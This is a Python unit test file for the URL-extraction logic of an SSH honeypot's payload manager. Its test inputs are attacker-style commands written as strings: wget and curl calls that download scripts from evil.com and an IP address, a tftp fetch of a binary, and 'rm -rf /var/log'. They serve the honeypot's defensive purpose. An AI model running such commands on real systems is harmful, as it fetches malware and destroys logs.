import unittest
from ssh_honeypot.core.payload_manager import PayloadManager


class TestPayloadLogic(unittest.TestCase):
    def setUp(self):
        # Pass None as DB since we are testing static extraction logic
        self.pm = PayloadManager(db=None)

    def test_extract_basic_http(self):
        cmd = "wget http://evil.com/malware.sh"
        urls = self.pm.extract_urls(cmd)
        self.assertIn("http://evil.com/malware.sh", urls)

    def test_extract_multiple_urls(self):
        cmd = "curl -O http://site1.com/a.sh; wget https://site2.com/b.py"
        urls = self.pm.extract_urls(cmd)
        self.assertIn("http://site1.com/a.sh", urls)
        self.assertIn("https://site2.com/b.py", urls)

    def test_extract_schemeless_ip(self):
        cmd = "wget 192.168.1.100/loader.elf"
        urls = self.pm.extract_urls(cmd)
        # Should prepend http://
        self.assertIn("http://192.168.1.100/loader.elf", urls)

    def test_extract_quoted(self):
        cmd = "curl 'http://evil.com/setup.sh'"
        urls = self.pm.extract_urls(cmd)
        self.assertIn("http://evil.com/setup.sh", urls)

    def test_ignore_local_paths(self):
        cmd = "rm -rf /var/log"
        urls = self.pm.extract_urls(cmd)
        self.assertEqual(urls, [])

    def test_tftp_extraction_todo(self):
        # Documenting current limitation or future feat
        cmd = "tftp -g -r mips 1.2.3.4"
        urls = self.pm.extract_urls(cmd)
        # Current logic might fail this if not explicitly handled
        # Just ensure it doesn't crash
        pass


if __name__ == "__main__":
    unittest.main()
